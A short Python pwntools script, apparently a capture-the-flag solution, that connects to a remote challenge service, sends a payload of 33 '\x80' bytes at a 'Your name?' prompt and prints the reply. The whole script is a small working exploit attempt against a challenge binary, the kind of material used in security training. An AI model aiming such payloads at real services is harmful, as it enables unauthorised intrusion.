from pwn import *
import time
import traceback

# https://es7evam.gitbook.io/security-studies/exploitation/sockets/03-connections-with-pwntools

e = context.binary = binary = ELF("./task/task")

payload = '\x80' * 33

conn = remote('rivit.dev', 10022)
conn.recvuntil("Your name? ")
conn.sendline(payload)

s = conn.recvall()
print("output", s)

conn.close()
